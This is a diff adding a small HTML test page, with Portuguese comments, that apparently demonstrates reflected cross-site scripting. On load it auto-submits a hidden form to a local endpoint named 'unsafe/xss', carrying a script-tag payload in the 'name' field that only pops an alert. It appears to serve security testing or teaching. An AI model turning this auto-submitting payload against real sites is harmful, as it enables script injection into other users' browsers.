@@ -1,0 +1,27 @@
+<!-- O formulário envia um POST do tipo 'text/plain'
+    Ele envia também um script em JS criado para parecer um arquivo JSON que contém um script malicioso
+    Assim que a página for carregada o script será enviado.
+    Ao chegar no servidor, a validação indicará um erro no campo 'owner' e retornará uma resposta para o navegador. Nesta resposta, o script será acionado.
+-->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Test</title>
+</head>
+<body>
+    <form id="xssForm" method="POST" action="http://localhost:8080/spaces/unsafe/xss">
+        <input type="hidden" name="name" value="<script>alert('XSS Attacked!')</script>">
+        <input type="hidden" name="owner" value="test">
+    </form>
+
+    <script>
+        // Enviar o formulário automaticamente quando a página carregar
+        window.onload = function() {
+            document.getElementById('xssForm').submit();
+        }
+    </script>
+</body>
+</html>
